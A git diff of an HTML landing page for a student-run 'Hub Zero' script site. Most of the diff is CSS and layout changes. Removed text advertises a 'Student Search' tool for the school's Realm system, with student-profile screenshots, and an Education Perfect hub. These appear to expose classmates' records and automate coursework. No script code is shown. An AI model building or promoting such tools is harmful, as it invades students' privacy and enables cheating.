@@ -9,13 +9,13 @@
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #0a0a0a;
-    --fg: #f2efe7;
-    --muted: #6e6c66;
+    --bg: #000000;
+    --card: #080808;
+    --line: #141414;
+    --fg: #ffffff;
+    --muted: #64748b;
     --accent: #d4ff3a;
-    --line: rgba(242,239,231,0.1);
-    --card: #131313;
-    --ease: cubic-bezier(0.65, 0.05, 0.1, 1);
+    --ease: cubic-bezier(0.16, 1, 0.3, 1);
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,7 +30,6 @@
   }
   ::selection { background: var(--accent); color: var(--bg); }
 
-  
   .loader {
     position: fixed;
     inset: 0;
@@ -54,7 +53,7 @@
   .loader-line {
     width: 100%;
     height: 1px;
-    background: rgba(242, 239, 231, 0.1);
+    background: rgba(255, 255, 255, 0.1);
     position: relative;
     overflow: hidden;
   }
@@ -83,7 +82,6 @@
     50% { opacity: 1; }
   }
 
-  
   .progress {
     position: fixed;
     top: 0; left: 0;
@@ -94,7 +92,6 @@
     transition: width 0.05s linear;
   }
 
-  
   nav {
     position: fixed;
     top: 0; left: 0; right: 0;
@@ -103,7 +100,7 @@
     justify-content: space-between;
     align-items: center;
     z-index: 100;
-    background: rgba(10, 10, 10, 0.75);
+    background: rgba(0, 0, 0, 0.75);
     backdrop-filter: blur(12px);
     -webkit-backdrop-filter: blur(12px);
     border-bottom: 1px solid var(--line);
@@ -122,14 +119,6 @@
     display: flex;
     align-items: center;
     gap: 16px;
-  }
-  .nav-sub {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 10px;
-    font-weight: 400;
-    color: var(--muted);
-    letter-spacing: 0.05em;
-    text-transform: uppercase;
   }
   .nav-meta {
     font-family: 'JetBrains Mono', monospace;
@@ -156,7 +145,6 @@
   }
   .nav-meta a:hover::after { width: 100%; }
 
-  
   .hero {
     min-height: 100vh;
     padding: 140px 40px 60px;
@@ -164,23 +152,17 @@
     flex-direction: column;
     justify-content: center;
     position: relative;
-    background-image: radial-gradient(circle at 1px 1px, rgba(242,239,231,0.05) 1px, transparent 0);
+    background-image: radial-gradient(circle at 1px 1px, rgba(255,255,255,0.03) 1px, transparent 0);
     background-size: 44px 44px;
   }
-  .hero-top {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    color: var(--muted);
+
+  .hero-content {
+    max-width: 1000px;
+    margin: 0 auto;
+    width: 100%;
   }
 
-  
-
-  .hero-title-wrap { margin: 30px 0; position: relative; }
+  .hero-title-wrap { margin: 30px 0; position: relative; text-align: center; }
   .hero-title {
     font-size: clamp(48px, 10vw, 120px);
     font-weight: 800;
@@ -209,10 +191,9 @@
     color: var(--accent);
   }
 
-  
   .hero-arrow {
     position: absolute;
-    bottom: 60px;
+    bottom: 40px;
     left: 50%;
     transform: translateX(-50%);
     display: flex;
@@ -225,10 +206,9 @@
   }
   @keyframes arrowBounce {
     0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(15px); }
+    50% { transform: translateY(12px); }
   }
 
-  
   .marquee {
     border-top: 1px solid var(--line);
     border-bottom: 1px solid var(--line);
@@ -266,21 +246,6 @@
   }
   @keyframes marquee { to { transform: translateX(-50%); } }
 
-  
-  .services {
-    padding: 140px 40px 220px;
-    border-bottom: 1px solid var(--line);
-  }
-  .services-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: end;
-    margin-bottom: 80px;
-    gap: 40px;
-    max-width: 1000px;
-    margin-left: auto;
-    margin-right: auto;
-  }
   .services-title {
     font-size: clamp(40px, 6vw, 88px);
     font-weight: 700;
@@ -293,459 +258,231 @@
     font-style: italic;
     color: var(--accent);
   }
-  .services-tag {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--muted);
-    text-align: right;
-  }
-  .services-tag strong {
-    display: block;
-    color: var(--accent);
-    font-weight: 500;
-    margin-top: 4px;
-  }
-  .services-grid {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 80px 40px;
-    max-width: 1000px;
-    margin: 0 auto;
-  }
-  
-  .services-grid > *:nth-child(even) {
-    transform: translateY(60px);
-  }
-  .services-item {
-    position: relative;
-    overflow: hidden;
-    background: var(--card);
-    border: 1px solid var(--line);
-    aspect-ratio: 16/10;
-    transition: border-color 0.8s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.8s cubic-bezier(0.16, 1, 0.3, 1), transform 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  .services-item:hover {
-    border-color: var(--accent);
-    box-shadow: 0 20px 40px rgba(212, 255, 58, 0.08);
-    transform: translateY(-8px);
-  }
-  .services-item img {
-    width: 100%; height: 100%;
-    object-fit: cover;
-    transition: transform 1.6s cubic-bezier(0.16, 1, 0.3, 1), filter 1.6s cubic-bezier(0.16, 1, 0.3, 1);
-    filter: grayscale(30%) brightness(0.85);
-  }
-  .services-item:hover img {
-    transform: scale(1.08);
-    filter: grayscale(0%) brightness(1.05);
-  }
-  .services-item-info {
-    position: absolute;
-    inset: 0;
-    padding: 24px;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    z-index: 2;
-    pointer-events: none;
-  }
-  .services-item-num {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    color: var(--accent);
-    letter-spacing: 0.12em;
-    transform: translateY(-10px);
-    opacity: 0;
-    transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  .services-item:hover .services-item-num {
-    transform: translateY(0);
-    opacity: 1;
-  }
-  .services-item-name {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--fg);
-    align-self: flex-end;
-    background: rgba(0,0,0,0.65);
-    padding: 6px 12px;
-    backdrop-filter: blur(8px);
-    -webkit-backdrop-filter: blur(8px);
-    border: 1px solid var(--line);
-    transform: translateY(10px);
-    opacity: 0;
-    transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.6s cubic-bezier(0.16, 1, 0.3, 1), background-color 0.3s;
-  }
-  .services-item:hover .services-item-name {
-    transform: translateY(0);
-    opacity: 1;
-    background: var(--accent);
-    color: var(--bg);
-    border-color: var(--accent);
-  }
 
-  
-  footer {
-    padding: 120px 40px 40px;
-    position: relative;
-    overflow: hidden;
+  /* About section styles */
+  .about-section {
+    padding: 120px 40px;
+    border-bottom: 1px solid var(--line);
   }
-  .footer-logo {
-    font-size: clamp(60px, 14vw, 160px);
-    font-weight: 800;
-    line-height: 0.9;
-    letter-spacing: -0.04em;
-    margin-bottom: 80px;
+  .about-header {
     text-align: center;
-    text-transform: uppercase;
-    font-family: 'Syne', sans-serif;
+    margin-bottom: 60px;
   }
-  .footer-logo span {
-    display: inline-block;
-    color: transparent;
-    -webkit-text-stroke: 1px var(--fg);
-  }
-  .footer-logo em {
-    font-family: 'Instrument Serif', serif;
-    font-weight: 400;
-    font-style: italic;
-    color: var(--accent);
-    -webkit-text-stroke: 0;
-    text-transform: none;
-  }
-  .footer-bottom {
-    border-top: 1px solid var(--line);
-    padding: 30px 0 10px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+  .about-desc {
     font-family: 'JetBrains Mono', monospace;
-    font-size: 10px;
-    letter-spacing: 0.25em;
-    color: var(--muted);
-    text-transform: uppercase;
+    font-size: 15px;
+    color: #e2e8f0;
+    line-height: 1.8;
+    max-width: 800px;
+    margin: 0 auto 50px auto;
+    text-align: center;
   }
-
-  
-  .fade-up {
-    opacity: 0;
-    transform: translateY(20px);
-    transition: opacity 1.0s cubic-bezier(0.16, 1, 0.3, 1), transform 1.0s cubic-bezier(0.16, 1, 0.3, 1);
-    will-change: opacity, transform;
-  }
-  .fade-up.in { opacity: 1; transform: translateY(0); }
-  .fade-up.d1 { transition-delay: 0.1s; }
-  .fade-up.d2 { transition-delay: 0.2s; }
-  .fade-up.d3 { transition-delay: 0.3s; }
-
-  .modal-demo-link {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12.5px;
-    color: var(--accent);
-    text-decoration: underline;
-    margin-bottom: 24px;
-    transition: color 0.2s ease;
-    align-self: flex-start;
-  }
-  .modal-demo-link:hover {
-    color: #ffffff;
-  }
-  .modal-description-sub {
-    font-size: 14px;
-    color: var(--muted);
-    line-height: 1.6;
-    margin-top: -16px;
-    margin-bottom: 24px;
-  }
-  .highlight-green {
-    color: var(--accent);
-  }
-
-  .lightbox-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.95);
-    backdrop-filter: blur(12px);
-    -webkit-backdrop-filter: blur(12px);
-    z-index: 2000000;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    animation: fade-in-lightbox 0.25s ease;
-  }
-  .lightbox-content {
-    max-width: 90%;
-    max-height: 85%;
-    overflow-y: auto;
-    cursor: default;
-    padding: 20px;
-    box-sizing: border-box;
-  }
-  .lightbox-grid {
+  .scripts-showcase {
     display: grid;
     grid-template-columns: repeat(2, 1fr);
-    gap: 20px;
+    gap: 40px;
     max-width: 1000px;
     margin: 0 auto;
   }
   @media (max-width: 768px) {
-    .lightbox-grid {
+    .scripts-showcase {
       grid-template-columns: 1fr;
     }
   }
-  .lightbox-grid img {
-    width: 100%;
-    height: auto;
-    border-radius: 12px;
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    box-shadow: 0 15px 45px rgba(0,0,0,0.6);
-  }
-  @keyframes fade-in-lightbox {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  
-  body.modal-open {
-    overflow: hidden;
-  }
-  .modal-overlay {
-    position: fixed;
-    inset: 0;
-    background: #000000; 
-    z-index: 10000;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity 0.4s ease;
-  }
-  .modal-overlay.active {
-    opacity: 1;
-    pointer-events: auto;
-  }
-  .modal-box {
-    background: var(--card); 
+  .script-card {
+    background: var(--card);
     border: 1px solid var(--line);
-    padding: 50px;
-    max-width: 600px;
-    width: 90%;
-    position: relative;
-    box-shadow: 0 40px 80px rgba(0,0,0,0.8);
-    transform: scale(0.97);
-    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  .modal-overlay.active .modal-box {
-    transform: scale(1);
-  }
-  .modal-step {
-    display: flex;
-    flex-direction: column;
-  }
-  .modal-title {
-    font-size: 26px;
-    font-weight: 800;
-    line-height: 1.2;
-    letter-spacing: -0.02em;
-    margin-bottom: 28px;
-    color: #ffffff; 
-    text-transform: uppercase;
-  }
-  .modal-title.highlight {
-    color: var(--accent);
-  }
-  .modal-title.highlight-red {
-    color: #ef4444;
-  }
-  .modal-list {
-    list-style: none;
-    margin-bottom: 32px;
-    display: flex;
-    flex-direction: column;
-    gap: 14px;
-  }
-  .modal-list li {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 14px;
-    line-height: 1.8;
-    color: #a3a3a3; 
-  }
-  .modal-list li strong {
-    color: #ffffff; 
-  }
-  .modal-list li strong.highlight {
-    color: var(--accent);
-  }
-  .modal-text {
-    font-size: 16px;
-    line-height: 1.7;
-    color: #e5e5e5; 
-    margin-bottom: 24px;
-  }
-  .modal-info-box {
-    background: rgba(212, 255, 58, 0.04);
-    border-left: 3px solid var(--accent);
-    padding: 20px 24px;
-    margin-bottom: 24px;
-  }
-  .modal-info-box-title {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
-    font-weight: 600;
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    margin-bottom: 8px;
-    display: block;
-  }
-  .modal-info-box .modal-text {
-    margin-bottom: 0;
-    font-size: 15px;
-    line-height: 1.6;
-    color: #e5e5e5;
-  }
-  .modal-text.warning {
-    color: #ef4444;
-    font-weight: 700;
-    text-transform: uppercase;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 13px;
-    letter-spacing: 0.05em;
-  }
-  .modal-text.info {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
-    color: var(--muted);
-    border-top: 1px solid var(--line);
-    padding-top: 20px;
-    margin-top: 10px;
-  }
-  .modal-link {
-    color: var(--accent);
-    text-decoration: underline;
-    transition: color 0.3s;
-  }
-  .modal-link:hover {
-    color: var(--fg);
-  }
-  .modal-footer-warning {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    color: var(--muted);
-    margin-bottom: 24px;
-    text-transform: uppercase;
-    letter-spacing: 0.05em;
-  }
-  .modal-buttons {
-    display: flex;
-    gap: 16px;
-    justify-content: flex-end;
-  }
-  .btn {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    padding: 12px 28px;
-    border: 1px solid transparent;
-    cursor: pointer;
-    font-weight: 600;
+    padding: 32px;
+    border-radius: 12px;
     transition: all 0.3s var(--ease);
   }
-  .btn-red {
-    background: transparent;
-    border-color: #ef4444;
-    color: #ef4444;
+  .script-card:hover {
+    border-color: var(--accent);
+    box-shadow: 0 10px 30px rgba(212, 255, 58, 0.05);
+    transform: translateY(-4px);
   }
-  .btn-red:hover {
-    background: #ef4444;
+  .script-card-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 16px;
     color: #ffffff;
-    box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
   }
-  .btn-green {
-    background: var(--accent);
-    border-color: var(--accent);
-    color: var(--bg);
+  .script-card-desc {
+    font-size: 14.5px;
+    color: var(--muted);
+    line-height: 1.7;
   }
-  .btn-green:hover {
-    background: transparent;
-    border-color: var(--accent);
+
+  /* Gallery section styles */
+  .gallery-section {
+    padding: 120px 40px;
+    border-bottom: 1px solid var(--line);
+  }
+  .gallery-header {
+    text-align: center;
+    margin-bottom: 60px;
+  }
+  .gallery-subtitle {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
     color: var(--accent);
-    box-shadow: 0 0 15px rgba(212, 255, 58, 0.4);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    margin-top: 10px;
   }
-
-  
-  @media (max-width: 900px) {
-    nav { padding: 18px 20px; }
-    .nav-meta { gap: 14px; font-size: 10px; }
-    .nav-meta span:last-child { display: none; }
-    .nav-sub { display: none; }
-    .hero { padding: 120px 20px 40px; }
-    .hero-side { display: none; }
-    .services { padding: 80px 20px 120px; }
-    .services-header { flex-direction: column; align-items: flex-start; gap: 16px; }
-    .services-tag { text-align: left; }
-    .services-grid { grid-template-columns: 1fr; gap: 40px; }
-    .services-grid > *:nth-child(even) { transform: none; }
-    footer { padding: 80px 20px 30px; }
-    .footer-logo { margin-bottom: 60px; }
+  .gallery-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 30px;
+    max-width: 1100px;
+    margin: 0 auto;
   }
-
-  @media (prefers-reduced-motion: reduce) {
-    *, *::before, *::after {
-      animation-duration: 0.01ms !important;
-      transition-duration: 0.01ms !important;
+  @media (max-width: 768px) {
+    .gallery-grid {
+      grid-template-columns: 1fr;
     }
   }
-
-  
-  .hero-top-welcome {
-    font-size: 11px;
-    font-weight: 700;
-    color: #ffffff;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    align-self: center;
-  }
-  .hero-top-actions {
-    display: flex;
-    gap: 12px;
-  }
-  .hero-top-btn {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 10px;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    background: transparent;
+  .gallery-item {
+    background: var(--card);
     border: 1px solid var(--line);
-    color: var(--muted);
-    padding: 6px 12px;
-    border-radius: 4px;
-    cursor: pointer;
-    transition: all 0.2s ease;
+    border-radius: 12px;
+    overflow: hidden;
+    transition: all 0.4s var(--ease);
   }
-  .hero-top-btn.btn-relink {
+  .gallery-item:hover {
     border-color: var(--accent);
-    color: var(--accent);
+    transform: scale(1.02);
   }
-  .hero-top-btn.btn-relink:hover {
-    background: var(--accent);
-    color: var(--bg);
-    box-shadow: 0 0 15px rgba(212, 255, 58, 0.4);
+  .gallery-item img {
+    width: 100%;
+    height: auto;
+    display: block;
+    aspect-ratio: 16/10;
+    object-fit: cover;
   }
-  .hero-top-btn.btn-logout:hover {
-    border-color: #ef4444;
-    color: #ef4444;
-    box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
+  .gallery-caption {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--muted);
+    padding: 16px;
+    border-top: 1px solid var(--line);
+    background: #020202;
   }
 
-  
+  /* Get scripts section styles */
+  .get-scripts-section {
+    padding: 120px 40px;
+    border-bottom: 1px solid var(--line);
+    text-align: center;
+  }
+  .get-scripts-subtitle {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    color: var(--muted);
+  }
+  .btn-large {
+    padding: 18px 48px;
+    font-size: 13px;
+    border-radius: 6px;
+    letter-spacing: 0.2em;
+  }
+
+  /* Logged In Dashboard styling */
+  .welcome-box {
+    margin-top: 30px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    padding: 40px;
+    border-radius: 16px;
+    max-width: 700px;
+    margin-left: auto;
+    margin-right: auto;
+    text-align: center;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+  }
+  .welcome-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    margin-bottom: 24px;
+    color: #ffffff;
+  }
+  .welcome-actions {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+  }
+
+  /* How to use toggle wrapper */
+  .how-to-use-wrapper {
+    margin-top: 24px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .how-to-toggle {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    color: var(--accent);
+    background: none;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 0;
+    outline: none;
+    transition: color 0.2s ease;
+  }
+  .how-to-toggle:hover {
+    color: #ffffff;
+  }
+  .toggle-arrow {
+    font-size: 10px;
+    transition: transform 0.3s var(--ease);
+  }
+  .how-to-toggle.active .toggle-arrow {
+    transform: rotate(180deg);
+  }
+  .how-to-content {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.4s var(--ease), padding 0.4s var(--ease);
+    text-align: left;
+    background: var(--card);
+    border: 1px solid transparent;
+    border-radius: 8px;
+    box-sizing: border-box;
+    width: 100%;
+    max-width: 700px;
+  }
+  .how-to-content.active {
+    max-height: 300px;
+    border-color: var(--line);
+    padding: 24px;
+    margin-top: 10px;
+  }
+  .how-to-content h4 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    margin-bottom: 16px;
+    letter-spacing: 0.1em;
+  }
+  .how-to-content ol {
+    margin-left: 20px;
+    color: #cbd5e1;
+    font-size: 14px;
+    line-height: 1.8;
+  }
+  .how-to-content li {
+    margin-bottom: 12px;
+  }
+
   .nav-btn-accent {
     background: var(--accent);
     color: var(--bg) !important;
@@ -762,7 +499,6 @@
     display: none !important;
   }
 
-  
   .scripts-loader {
     padding: 100px 40px;
     border-bottom: 1px solid var(--line);
@@ -820,19 +556,309 @@
     box-shadow: 0 0 15px rgba(212, 255, 58, 0.4);
   }
 
-  noscript style {
+  footer {
+    padding: 120px 40px 40px;
+    position: relative;
+    overflow: hidden;
+  }
+  .footer-logo {
+    font-size: clamp(60px, 14vw, 160px);
+    font-weight: 800;
+    line-height: 0.9;
+    letter-spacing: -0.04em;
+    margin-bottom: 80px;
+    text-align: center;
+    text-transform: uppercase;
+    font-family: 'Syne', sans-serif;
+  }
+  .footer-logo span {
+    display: inline-block;
+    color: transparent;
+    -webkit-text-stroke: 1px var(--fg);
+  }
+  .footer-logo em {
+    font-family: 'Instrument Serif', serif;
+    font-weight: 400;
+    font-style: italic;
+    color: var(--accent);
+    -webkit-text-stroke: 0;
+    text-transform: none;
+  }
+  .footer-bottom {
+    border-top: 1px solid var(--line);
+    padding: 30px 0 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.25em;
+    color: var(--muted);
+    text-transform: uppercase;
+  }
+
+  .fade-up {
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 1.0s cubic-bezier(0.16, 1, 0.3, 1), transform 1.0s cubic-bezier(0.16, 1, 0.3, 1);
+    will-change: opacity, transform;
+  }
+  .fade-up.in { opacity: 1; transform: translateY(0); }
+  .fade-up.d1 { transition-delay: 0.1s; }
+  .fade-up.d2 { transition-delay: 0.2s; }
+  .fade-up.d3 { transition-delay: 0.3s; }
+
+  body.modal-open {
+    overflow: hidden;
+  }
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.95);
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    z-index: 10000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.4s var(--ease);
+  }
+  .modal-overlay.active {
+    opacity: 1;
+    pointer-events: auto;
+  }
+  .modal-box {
+    background: var(--card);
+    border: 1px solid var(--line);
+    padding: 50px;
+    max-width: 600px;
+    width: 90%;
+    position: relative;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+    transform: scale(0.97);
+    transition: transform 0.4s var(--ease);
+  }
+  .modal-overlay.active .modal-box {
+    transform: scale(1);
+  }
+  .modal-step {
+    display: flex;
+    flex-direction: column;
+  }
+  .modal-title {
+    font-size: 26px;
+    font-weight: 800;
+    line-height: 1.2;
+    letter-spacing: -0.02em;
+    margin-bottom: 28px;
+    color: #ffffff;
+    text-transform: uppercase;
+  }
+  .modal-title.highlight {
+    color: var(--accent);
+  }
+  .modal-title.highlight-red {
+    color: #ef4444;
+  }
+  .modal-text {
+    font-size: 16px;
+    line-height: 1.7;
+    color: #e5e5e5;
+    margin-bottom: 24px;
+  }
+  .modal-info-box {
+    background: rgba(212, 255, 58, 0.04);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin-bottom: 24px;
+  }
+  .modal-info-box-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 8px;
     display: block;
   }
+  .modal-info-box .modal-text {
+    margin-bottom: 0;
+    font-size: 15px;
+    line-height: 1.6;
+    color: #e5e5e5;
+  }
+  .modal-text.warning {
+    color: #ef4444;
+    font-weight: 700;
+    text-transform: uppercase;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    letter-spacing: 0.05em;
+  }
+  .modal-text.info {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+    border-top: 1px solid var(--line);
+    padding-top: 20px;
+    margin-top: 10px;
+  }
+  .modal-footer-warning {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    margin-bottom: 24px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .modal-buttons {
+    display: flex;
+    gap: 16px;
+    justify-content: flex-end;
+  }
+  .btn {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    padding: 12px 28px;
+    border: 1px solid transparent;
+    cursor: pointer;
+    font-weight: 600;
+    transition: all 0.3s var(--ease);
+  }
+  .btn-red {
+    background: transparent;
+    border-color: #ef4444;
+    color: #ef4444;
+  }
+  .btn-red:hover {
+    background: #ef4444;
+    color: #ffffff;
+    box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
+  }
+  .btn-green {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: var(--bg);
+  }
+  .btn-green:hover {
+    background: transparent;
+    border-color: var(--accent);
+    color: var(--accent);
+    box-shadow: 0 0 15px rgba(212, 255, 58, 0.4);
+  }
+  .highlight-green {
+    color: var(--accent);
+  }
+
+  /* Setup modal design modifications */
+  .setup-modal-box {
+    max-width: 650px !important;
+    padding: 40px !important;
+  }
+  .modal-text-intro {
+    font-size: 14px;
+    color: #cbd5e1;
+    line-height: 1.6;
+    margin-bottom: 24px;
+  }
+  .setup-scroll-container {
+    max-height: 350px;
+    overflow-y: auto;
+    padding-right: 12px;
+    border-bottom: 1px solid var(--line);
+    margin-bottom: 10px;
+  }
+  .setup-scroll-container::-webkit-scrollbar {
+    width: 6px;
+  }
+  .setup-scroll-container::-webkit-scrollbar-track {
+    background: transparent;
+  }
+  .setup-scroll-container::-webkit-scrollbar-thumb {
+    background: #262626;
+    border-radius: 3px;
+  }
+  .setup-section {
+    background: rgba(255,255,255,0.01);
+    border: 1px solid var(--line);
+    padding: 20px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+  }
+  .setup-section-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    margin-bottom: 12px;
+    text-transform: uppercase;
+  }
+  .setup-list {
+    margin-left: 18px;
+    margin-bottom: 16px;
+    color: #cbd5e1;
+    font-size: 13px;
+    line-height: 1.7;
+  }
+  .setup-list li {
+    margin-bottom: 8px;
+  }
+  .setup-desc-text {
+    font-size: 13.5px;
+    color: #cbd5e1;
+    line-height: 1.7;
+    margin-bottom: 16px;
+  }
+  .setup-checkbox-label {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    font-size: 13px;
+    color: #ffffff;
+    cursor: pointer;
+    user-select: none;
+  }
+  .setup-checkbox-label input[type="checkbox"] {
+    margin-top: 3px;
+    accent-color: var(--accent);
+    cursor: pointer;
+  }
+  .setup-warning-block {
+    background: rgba(239, 68, 68, 0.08);
+    border: 1px solid rgba(239, 68, 68, 0.3);
+    padding: 20px;
+    border-radius: 8px;
+    color: #fca5a5;
+    font-size: 13px;
+    line-height: 1.7;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 20px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .final-section {
+    background: rgba(212, 255, 58, 0.03);
+    border-color: rgba(212, 255, 58, 0.2);
+  }
+  .final-label {
+    font-size: 14px;
+    color: var(--accent);
+  }
+  .btn:disabled {
+    background: #1a1a1a !important;
+    border-color: #1a1a1a !important;
+    color: #404040 !important;
+    cursor: not-allowed !important;
+    box-shadow: none !important;
+  }
 </style>
-<noscript>
-<style>
-  .fade-up { opacity: 1 !important; transform: none !important; }
-  .hero-title .line > span { transform: translateY(0) !important; }
-</style>
-</noscript>
 </head>
 <body>
-
 
 <div class="loader" id="loader">
   <div class="loader-inner">
@@ -843,77 +869,37 @@
 
 <div class="progress" id="progress"></div>
 
-
-<div class="modal-overlay" id="modal-overlay">
-  <div class="modal-box">
-    
-    <div class="modal-step" id="modal-step-edge" style="display: none;">
-      <h3 class="modal-title highlight-red">Edge Required</h3>
-      <p class="modal-text">This platform can only be accessed using <strong>Microsoft Edge</strong> to ensure script compatibility.</p>
-      <p class="modal-text info">Please copy this link and open it in Edge.</p>
-      <div class="modal-footer-warning">
-        Unsupported Browser
-      </div>
-    </div>
-
-    
-    <div class="modal-step" id="modal-step-1">
-      <h3 class="modal-title">Welcome to Hub Zero <span class="highlight-green">(SPC Scripts)</span></h3>
-      <p class="modal-description-sub">So uh theres this fr:</p>
-      <ul class="modal-list">
-        <li><strong>• Student Search (Realm)</strong></li>
-        <li><strong>• Education Perfect hub</strong></li>
-      </ul>
-      <a href="#" class="modal-demo-link" id="btn-show-demo">Click here if you want to view images of our scripts in action!!</a>
-      <div class="modal-buttons">
-        <button class="btn btn-red" id="btn-no">No</button>
-        <button class="btn btn-green" id="btn-yes">Yes</button>
-      </div>
-    </div>
-    
-    
-    <div class="modal-step" id="modal-step-2" style="display: none;">
-      <h3 class="modal-title highlight">Redirecting</h3>
-      <div class="modal-info-box">
-        <span class="modal-info-box-title">Log in with Realm</span>
-        <p class="modal-text">Great! You will now need to login to add your name to the system :). Note: If you are NOT from St patricks college shorncliffe you will NOT have access to our scripts or this site. P.S teacher accounts do NOT work</p>
-      </div>
-      <p class="modal-text warning">Read above before going to realm sign on</p>
-      
-      <div class="modal-buttons">
-        <button class="btn btn-green" id="btn-okay">OKAY</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<div id="gallery-lightbox" class="lightbox-overlay">
-  <div class="lightbox-content">
-    <div class="lightbox-grid">
-      <img src="EP-Hub.png" alt="EP Hub">
-      <img src="Realm-Search.png" alt="Realm Search">
-      <img src="Realm-Yeargroup.png" alt="Realm Yeargroup">
-      <img src="Realm-Student-Profile.png" alt="Realm Student Profile">
-    </div>
-  </div>
-</div>
-
 <nav>
   <div class="nav-logo">HUB ZERO</div>
   <div class="nav-meta">
-    <a href="#services">Services</a>
-    <a href="#scripts-loader" class="nav-btn-accent">Get the script</a>
+    <span class="nav-non-logged" id="nav-non-logged-links">
+      <a href="#about">About</a>
+      <a href="#gallery">Gallery</a>
+      <a href="#get-scripts" class="nav-btn-accent">Get scripts</a>
+    </span>
+    <span class="nav-logged" id="nav-logged-links" style="display: none;">
+      <a href="#scripts-dashboard" class="nav-btn-accent">Dashboard</a>
